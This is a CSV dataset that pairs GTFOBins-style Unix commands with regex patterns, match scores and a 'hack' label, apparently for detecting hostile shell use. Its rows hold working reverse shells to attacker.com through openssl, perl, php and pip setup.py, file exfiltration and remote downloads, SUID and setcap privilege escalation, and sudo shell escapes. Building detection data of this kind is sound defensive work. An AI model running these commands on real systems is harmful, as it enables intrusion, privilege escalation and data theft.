ocode,code,word_count,match_count,match_score,hack
sudo install -m =xs $(which od) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which od\) \.",7,1,0.7941176470588235,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"./od -An -c -w9999 ""$LFILE""","\./od -An -c -w9999 ""\$LFILE""",5,0,0.07142857142857142,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"sudo od -An -c -w9999 ""$LFILE""","sudo od -An -c -w9999 ""\$LFILE""",6,0,0.03225806451612903,0
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes,openssl req -x509 -newkey rsa:4096 -keyout key\.pem -out cert\.pem -days 365 -nodes,12,0,0.024390243902439025,0
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345,openssl s_server -quiet -key key\.pem -cert cert\.pem -port 12345,9,0,0.03125,0
RHOST=attacker.com,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",1,2,1.631578947368421,0
RPORT=12345,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.5833333333333335,0
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s,mkfifo /tmp/s\; /bin/sh -i < /tmp/s 2>&1 \| openssl s_client -quiet -connect \$RHOST:\$RPORT > /tmp/s\; rm /tmp/s,17,0,0.045871559633027525,1
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes,openssl req -x509 -newkey rsa:4096 -keyout key\.pem -out cert\.pem -days 365 -nodes,12,0,0.024390243902439025,0
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save,openssl s_server -quiet -key key\.pem -cert cert\.pem -port 12345 > [\w\-_\/]+,11,1,0.16455696202531644,0
RHOST=attacker.com,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",1,2,1.631578947368421,0
RPORT=12345,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.5833333333333335,0
LFILE=file_to_send,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"openssl s_client -quiet -connect $RHOST:$RPORT < ""$LFILE""","openssl s_client -quiet -connect \$RHOST:\$RPORT < ""\$LFILE""",7,0,0.05172413793103448,0
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes,openssl req -x509 -newkey rsa:4096 -keyout key\.pem -out cert\.pem -days 365 -nodes,12,0,0.024390243902439025,0
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send,openssl s_server -quiet -key key\.pem -cert cert\.pem -port 12345 < [\w\-_\/]+,11,1,0.16455696202531644,0
RHOST=attacker.com,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",1,2,1.631578947368421,0
RPORT=12345,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.5833333333333335,0
LFILE=file_to_save,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"openssl s_client -quiet -connect $RHOST:$RPORT > ""$LFILE""","openssl s_client -quiet -connect \$RHOST:\$RPORT > ""\$LFILE""",7,0,0.05172413793103448,0
LFILE=file_to_write,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.55,0
"echo DATA | openssl enc -out ""$LFILE""","echo DATA \| openssl enc -out ""\$LFILE""",7,0,0.05263157894736842,0
LFILE=file_to_write,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.55,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
"echo ""DATA"" > $TF","echo ""DATA"" > \$TF",4,0,0.05555555555555555,0
"openssl enc -in ""$TF"" -out ""$LFILE""","openssl enc -in ""\$TF"" -out ""\$LFILE""",6,0,0.05555555555555555,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"openssl enc -in ""$LFILE""","openssl enc -in ""\$LFILE""",4,0,0.04,0
openssl req -engine ./lib.so,openssl req -engine \./lib\.so,4,0,0.06896551724137931,0
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes,openssl req -x509 -newkey rsa:4096 -keyout key\.pem -out cert\.pem -days 365 -nodes,12,0,0.024390243902439025,0
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345,openssl s_server -quiet -key key\.pem -cert cert\.pem -port 12345,9,0,0.03125,0
sudo install -m =xs $(which openssl) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which openssl\) \.",7,1,0.6923076923076923,0
RHOST=attacker.com,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",1,2,1.631578947368421,0
RPORT=12345,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.5833333333333335,0
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s,mkfifo /tmp/s\; /bin/sh -i < /tmp/s 2>&1 \| \./openssl s_client -quiet -connect \$RHOST:\$RPORT > /tmp/s\; rm /tmp/s,17,0,0.05405405405405406,1
sudo install -m =xs $(which openssl) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which openssl\) \.",7,1,0.6923076923076923,0
LFILE=file_to_write,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.55,0
"echo DATA | openssl enc -out ""$LFILE""","echo DATA \| openssl enc -out ""\$LFILE""",7,0,0.05263157894736842,0
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes,openssl req -x509 -newkey rsa:4096 -keyout key\.pem -out cert\.pem -days 365 -nodes,12,0,0.024390243902439025,0
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345,openssl s_server -quiet -key key\.pem -cert cert\.pem -port 12345,9,0,0.03125,0
RHOST=attacker.com,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",1,2,1.631578947368421,0
RPORT=12345,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.5833333333333335,0
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s,mkfifo /tmp/s\; /bin/sh -i < /tmp/s 2>&1 \| sudo openssl s_client -quiet -connect \$RHOST:\$RPORT > /tmp/s\; rm /tmp/s,18,0,0.043859649122807015,1
COMMAND=id,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.8181818181818183,0
TF=$(mktemp -u),[\w\-_]+=\$\(mktemp -u\),2,1,0.6875,0
"sudo openvt -- sh -c ""$COMMAND >$TF 2>&1""cat $TF","sudo openvt -- sh -c [\'|""]| -e [\'|""]|cat >.*<<.*\$COMMAND >\$TF 2>&1""cat \$TF",9,1,0.6326530612244898,1
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
paste $LFILE,paste \$LFILE,2,0,0.07692307692307693,0
sudo install -m =xs $(which paste) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which paste\) \.",7,1,0.7297297297297297,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
paste $LFILE,paste \$LFILE,2,0,0.07692307692307693,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
sudo paste $LFILE,sudo paste \$LFILE,3,0,0.05555555555555555,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
"echo 'import os; os.system(""/bin/sh"")' > $TF","echo 'import os\; os\.system\(""/bin/sh""\)' > \$TF",6,0,0.1111111111111111,1
pdb $TF,pdb \$TF,2,0,0.125,0
cont,cont,1,0,0.0,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
"echo 'import os; os.system(""/bin/sh"")' > $TF","echo 'import os\; os\.system\(""/bin/sh""\)' > \$TF",6,0,0.1111111111111111,1
sudo pdb $TF,sudo pdb \$TF,3,0,0.07692307692307693,0
cont,cont,1,0,0.0,0
"perl -e 'exec ""/bin/sh"";'","perl -c [\'|""]| -e [\'|""]|cat >.*<<.*exec ""/bin/sh""\;'",4,1,1.1153846153846154,1
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
"perl -e 'use Socket;$i=""$ENV{RHOST}"";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'","perl -c [\'|""]| -e [\'|""]|cat >.*<<.*use Socket\;\$[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\$ENV{RHOST}""\;\$[\w\-_]+=\$ENV{RPORT}\;socket\(S\,PF_INET\,SOCK_STREAM\,getprotobyname\(""tcp""\)\)\;if\(connect\(S\,sockaddr_in\(\$p\,inet_aton\(\$i\)\)\)\){open\(STDIN\,"">&S""\)\;open\(STDOUT\,"">&S""\)\;open\(STDERR\,"">&S""\)\;exec\(""/bin/sh -i""\)\;}\;'",5,4,0.4780701754385965,1
sudo install -m =xs $(which perl) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which perl\) \.",7,1,0.75,0
"./perl -e 'exec ""/bin/sh"";'","\./perl -c [\'|""]| -e [\'|""]|cat >.*<<.*exec ""/bin/sh""\;'",4,1,1.0714285714285714,1
"sudo perl -e 'exec ""/bin/sh"";'","sudo perl -c [\'|""]| -e [\'|""]|cat >.*<<.*exec ""/bin/sh""\;'",5,1,0.9354838709677419,1
cp $(which perl) .,cp \$\(which perl\) \.,4,0,0.21052631578947367,0
sudo setcap cap_setuid+ep perl,sudo setcap cap_setuid\+ep perl,4,0,0.03225806451612903,0
"./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec ""/bin/sh"";'","\./perl -c [\'|""]| -e [\'|""]|cat >.*<<.*use POSIX qw\(setuid\)\; POSIX::setuid\(0\)\; exec ""/bin/sh""\;'",8,1,0.5294117647058824,1
pg /etc/profile,pg /etc/profile,2,0,0.0,0
!/bin/sh,!/bin/sh,1,0,0.0,1
pg file_to_read,pg [\w\-_\/]+,2,1,0.6875,0
sudo install -m =xs $(which pg) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which pg\) \.",7,1,0.7941176470588235,0
./pg file_to_read,\./pg [\w\-_\/]+,2,1,0.6666666666666666,0
sudo pg /etc/profile,sudo pg /etc/profile,3,0,0.0,0
!/bin/sh,!/bin/sh,1,0,0.0,1
"export CMD=""/bin/sh""","export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.380952380952381,0
"php -r 'system(getenv(""CMD""));'","php -r 'system\(getenv\(""CMD""\)\)\;'",3,0,0.15625,0
"export CMD=""/bin/sh""","export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.380952380952381,0
"php -r 'passthru(getenv(""CMD""));'","php -r 'passthru\(getenv\(""CMD""\)\)\;'",3,0,0.14705882352941177,1
"export CMD=""/bin/sh""","export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.380952380952381,0
"php -r 'print(shell_exec(getenv(""CMD"")));'","php -r 'print\(shell_exec\(getenv\(""CMD""\)\)\)\;'",3,0,0.16279069767441862,0
"export CMD=""/bin/sh""","export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.380952380952381,0
"php -r '$r=array(); exec(getenv(""CMD""), $r); print(join(""//n"",$r));'","php -r '\$[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(\)\; exec\(getenv\(""CMD""\)\, \$r\)\; print\(join\(""//n""\,\$r\)\)\;'",6,2,0.6956521739130435,0
"export CMD=""/bin/sh""","export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.380952380952381,0
"php -r '$h=@popen(getenv(""CMD""),""r""); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'","php -r '\$[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(getenv\(""CMD""\)\,""r""\)\; if\(\$h\){ while\(!feof\(\$h\)\) echo\(fread\(\$h\,4096\)\)\; pclose\(\$h\)\; }'",8,2,0.57,0
"export CMD=""id""","export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.875,0
"php -r '$p = array(array(""pipe"",""r""),array(""pipe"",""w""),array(""pipe"", ""w""));$h = @proc_open(getenv(""CMD""), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'","php -r '\$p =[ a-z0-9\.\-\/\'\""_\@]+\(array\(""pipe""\,""r""\)\,array\(""pipe""\,""w""\)\,array\(""pipe""\, ""w""\)\)\;\$h =[ a-z0-9\.\-\/\'\""_\@]+\(getenv\(""CMD""\)\, \$p\, \$pipes\)\;if\(\$h&&\$pipes\){while\(!feof\(\$pipes1\)\) echo\(fread\(\$pipes1\,4096\)\)\;while\(!feof\(\$pipes2\)\) echo\(fread\(\$pipes2\,4096\)\)\;fclose\(\$pipes0\)\;fclose\(\$pipes1\)\;fclose\(\$pipes2\)\;proc_close\(\$h\)\;}'",12,2,0.376271186440678,0
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
"php -r '$sock=fsockopen(getenv(""RHOST""),getenv(""RPORT""));exec(""/bin/sh -i <&3 >&3 2>&3"");'","php -r '\$[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(getenv\(""RHOST""\)\,getenv\(""RPORT""\)\)\;exec\(""/bin/sh -i <&3 >&3 2>&3""\)\;'",7,2,0.4725274725274725,1
LHOST=0.0.0.0,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.0\.0\.0",1,2,2.357142857142857,0
LPORT=8888,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.8181818181818183,0
php -S $LHOST:$LPORT,php -S \$LHOST:\$LPORT,3,0,0.09523809523809523,0
export URL=http://attacker.com/file_to_get,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/[\w\-_\/]+",2,3,1.0,0
export LFILE=file_to_save,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"php -r '$c=file_get_contents(getenv(""URL""));file_put_contents(getenv(""LFILE""), $c);'","php -r '\$[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(getenv\(""URL""\)\)\;file_put_contents\(getenv\(""LFILE""\)\, \$c\)\;'",4,2,0.5176470588235295,0
sudo install -m =xs $(which php) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which php\) \.",7,1,0.7714285714285715,0
"CMD=""/bin/sh""","[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.0714285714285716,0
"./php -r ""pcntl_exec('/bin/sh', ['-p']);""","\./php -r ""pcntl_exec\('/bin/sh'\, '-p'\)\;""",4,0,0.125,1
"CMD=""/bin/sh""","[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.0714285714285716,0
"sudo php -r ""system('$CMD');""","sudo php -r ""system\('\$CMD'\)\;""",4,0,0.13333333333333333,0
cp $(which php) .,cp \$\(which php\) \.,4,0,0.2222222222222222,0
sudo setcap cap_setuid+ep php,sudo setcap cap_setuid\+ep php,4,0,0.03333333333333333,0
"CMD=""/bin/sh""","[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.0714285714285716,0
"./php -r ""posix_setuid(0); system('$CMD');""","\./php -r ""posix_setuid\(0\)\; system\('\$CMD'\)\;""",4,0,0.18181818181818182,0
pic -U,pic -U,2,0,0.0,0
.PS,\.PS,1,0,0.25,0
sh X sh X,sh X sh X,4,0,0.0,1
sudo pic -U,sudo pic -U,3,0,0.0,0
.PS,\.PS,1,0,0.25,0
sh X sh X,sh X sh X,4,0,0.0,1
sudo install -m =xs $(which pic) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which pic\) \.",7,1,0.7714285714285715,0
./pic -U,\./pic -U,2,0,0.1111111111111111,0
.PS,\.PS,1,0,0.25,0
sh X sh X,sh X sh X,4,0,0.0,1
pico,pico,1,0,0.0,0
^R^X,\^R\^X,1,0,0.4,0
reset; sh 1>&0 2>&0,reset\; sh 1>&0 2>&0,4,0,0.05,1
pico -s /bin/sh,pico -s /bin/sh,3,0,0.0,1
/bin/sh,/bin/sh,1,0,0.0,1
^T,\^T,1,0,0.3333333333333333,0
pico file_to_write,pico [\w\-_\/]+,2,1,0.631578947368421,0
DATA,DATA,1,0,0.0,0
^O,\^O,1,0,0.3333333333333333,0
pico file_to_read,pico [\w\-_\/]+,2,1,0.6111111111111112,0
sudo pico,sudo pico,2,0,0.0,0
^R^X,\^R\^X,1,0,0.4,0
reset; sh 1>&0 2>&0,reset\; sh 1>&0 2>&0,4,0,0.05,1
sudo install -m =xs $(which pico) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which pico\) \.",7,1,0.75,0
./pico -s /bin/sh,\./pico -s /bin/sh,3,0,0.05555555555555555,1
/bin/sh,/bin/sh,1,0,0.0,1
^T,\^T,1,0,0.3333333333333333,0
TF=$(mktemp -d),[\w\-_]+=\$\(mktemp -d\),2,1,0.6875,0
"echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py","echo ""import os\; os\.execl\('/bin/sh'\, 'sh'\, '-c'\, 'sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)'\)"" > \$TF/setup\.py",12,0,0.1875,1
pip install $TF,pip install \$TF,3,0,0.0625,0
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
TF=$(mktemp -d),[\w\-_]+=\$\(mktemp -d\),2,1,0.6875,0
"echo 'import sys,socket,os,pty;s=socket.socket()","echo 'import sys\,socket\,os\,pty\;[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.socket\(\)",3,2,0.7755102040816326,0
"s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))","s\.connect\(\(os\.getenv\(""RHOST""\)\,int\(os\.getenv\(""RPORT""\)\)\)\)",1,0,0.25,0
"[os.dup2(s.fileno(),fd) for fd in (0,1,2)]","os\.dup2\(s\.fileno\(\)\,fd\) for fd in \(0\,1\,2\)",5,0,0.2682926829268293,0
"pty.spawn(""/bin/sh"")' > $TF/setup.py","pty\.spawn\(""/bin/sh""\)' > \$TF/setup\.py",3,0,0.13513513513513514,1
pip install $TF,pip install \$TF,3,0,0.0625,0
export URL=http://attacker.com/,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/",2,2,1.0,0
export LFILE=file_to_send,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
TF=$(mktemp -d),[\w\-_]+=\$\(mktemp -d\),2,1,0.6875,0
echo 'import sys; from os import environ as e,echo 'import sys\; from os import environ as e,9,0,0.021739130434782608,0
"if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u","if sys\.version_info\.major ==[ a-z0-9\.\-\/\'\""_\@]+: import urllib\.request as r\, urllib\.parse as u",11,1,0.34615384615384615,0
"else: import urllib as u, urllib2 as r","else: import urllib as u\, urllib2 as r",8,0,0.02564102564102564,0
"r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' > $TF/setup.py","r\.urlopen\(e""URL""\, bytes\(u\.urlencode\({""d"":open\(e""LFILE""\)\.read\(\)}\)\.encode\(\)\)\)' > \$TF/setup\.py",4,0,0.20652173913043478,0
pip install $TF,pip install \$TF,3,0,0.0625,0
export LPORT=8888,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.7222222222222223,0
TF=$(mktemp -d),[\w\-_]+=\$\(mktemp -d\),2,1,0.6875,0
echo 'import sys; from os import environ as e,echo 'import sys\; from os import environ as e,9,0,0.021739130434782608,0
"if sys.version_info.major == 3: import http.server as s, socketserver as ss","if sys\.version_info\.major ==[ a-z0-9\.\-\/\'\""_\@]+: import http\.server as s\, socketserver as ss",11,1,0.34210526315789475,0
"else: import SimpleHTTPServer as s, SocketServer as ss","else: import SimpleHTTPServer as s\, SocketServer as ss",8,0,0.01818181818181818,0
"ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py","ss\.TCPServer\(\(""""\, int\(e""LPORT""\)\)\, s\.SimpleHTTPRequestHandler\)\.serve_forever\(\)' > \$TF/setup\.py",5,0,0.1595744680851064,0
pip install $TF,pip install \$TF,3,0,0.0625,0
export URL=http://attacker.com/file_to_get,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/[\w\-_\/]+",2,3,1.0,0
export LFILE=/tmp/file_to_save,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,0.967741935483871,0
TF=$(mktemp -d),[\w\-_]+=\$\(mktemp -d\),2,1,0.6875,0
echo 'import sys; from os import environ as e,echo 'import sys\; from os import environ as e,9,0,0.021739130434782608,0
if sys.version_info.major == 3: import urllib.request as r,"if sys\.version_info\.major ==[ a-z0-9\.\-\/\'\""_\@]+: import urllib\.request as r",8,1,0.423728813559322,0
else: import urllib as r,else: import urllib as r,5,0,0.0,0
"r.urlretrieve(e[""URL""], e[""LFILE""])' > $TF/setup.py","r\.urlretrieve\(e""URL""\, e""LFILE""\)' > \$TF/setup\.py",4,0,0.125,0
pip install $TF,pip install \$TF,3,0,0.0625,0
export LFILE=/tmp/file_to_save,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,0.967741935483871,0
TF=$(mktemp -d),[\w\-_]+=\$\(mktemp -d\),2,1,0.6875,0
"echo ""open('$LFILE','w+').write('DATA')"" > $TF/setup.py","echo ""open\('\$LFILE'\,'w\+'\)\.write\('DATA'\)"" > \$TF/setup\.py",4,0,0.17857142857142858,0
pip install $TF,pip install \$TF,3,0,0.0625,0
TF=$(mktemp -d),[\w\-_]+=\$\(mktemp -d\),2,1,0.6875,0
"echo 'raise Exception(open(""file_to_read"").read())' > $TF/setup.py","echo 'raise Exception\(open\(""[\w\-_\/]+""\)\.read\(\)\)' > \$TF/setup\.py",5,1,0.29850746268656714,0
pip install $TF,pip install \$TF,3,0,0.0625,0
TF=$(mktemp -d),[\w\-_]+=\$\(mktemp -d\),2,1,0.6875,0
"echo 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' > $TF/setup.py","echo 'from ctypes import cdll\; cdll\.LoadLibrary\(""lib\.so""\)' > \$TF/setup\.py",8,0,0.0945945945945946,0
pip install $TF,pip install \$TF,3,0,0.0625,0
TF=$(mktemp -d),[\w\-_]+=\$\(mktemp -d\),2,1,0.6875,0
"echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py","echo ""import os\; os\.execl\('/bin/sh'\, 'sh'\, '-c'\, 'sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)'\)"" > \$TF/setup\.py",12,0,0.1875,1
sudo pip install $TF,sudo pip install \$TF,4,0,0.047619047619047616,0
sudo pkexec /bin/sh,sudo pkexec /bin/sh,3,0,0.0,1
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
pr -T $LFILE,pr -T \$LFILE,3,0,0.07692307692307693,0
sudo install -m =xs $(which pr) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which pr\) \.",7,1,0.7941176470588235,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
pr -T $LFILE,pr -T \$LFILE,3,0,0.07692307692307693,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
pr -T $LFILE,pr -T \$LFILE,3,0,0.07692307692307693,0
pry,pry,1,0,0.0,0
"system(""/bin/sh"")","system\(""/bin/sh""\)",1,0,0.1111111111111111,1
sudo pry,sudo pry,2,0,0.0,0
"system(""/bin/sh"")","system\(""/bin/sh""\)",1,0,0.1111111111111111,1
sudo install -m =xs $(which pry) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which pry\) \.",7,1,0.7714285714285715,0
./pry,\./pry,1,0,0.16666666666666666,0
"system(""/bin/sh"")","system\(""/bin/sh""\)",1,0,0.1111111111111111,1
psql,psql,1,0,0.0,0
/?,/?,1,0,0.0,0
!/bin/sh,!/bin/sh,1,0,0.0,1
psql,psql,1,0,0.0,0
/?,/?,1,0,0.0,0
!/bin/sh,!/bin/sh,1,0,0.0,1
"puppet apply -e ""exec { '/bin/sh -c /""exec sh -i <$(tty) >$(tty) 2>$(tty)/""': }""","puppet apply -c [\'|""]| -e [\'|""]|cat >.*<<.*exec { '/bin/sh -c /""exec sh -i <\$\(tty\) >\$\(tty\) 2>\$\(tty\)/""': }""",14,1,0.4567901234567901,1
"LFILE=""/tmp/file_to_write""","[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.1481481481481481,0
"puppet apply -e ""file { '$LFILE': content => 'DATA' }""","puppet apply -c [\'|""]| -e [\'|""]|cat >.*<<.*file { '\$LFILE': content => 'DATA' }""",10,1,0.5272727272727272,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
puppet filebucket -l diff /dev/null $LFILE,puppet filebucket -l diff /dev/null \$LFILE,6,0,0.023255813953488372,0
"sudo puppet apply -e ""exec { '/bin/sh -c /""exec sh -i <$(tty) >$(tty) 2>$(tty)/""': }""","sudo puppet apply -c [\'|""]| -e [\'|""]|cat >.*<<.*exec { '/bin/sh -c /""exec sh -i <\$\(tty\) >\$\(tty\) 2>\$\(tty\)/""': }""",15,1,0.43023255813953487,1
"python -c 'import os; os.system(""/bin/sh"")'","python -c [\'|""]| -e [\'|""]|cat >.*<<.*import os\; os\.system\(""/bin/sh""\)'",5,1,0.7272727272727273,1
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
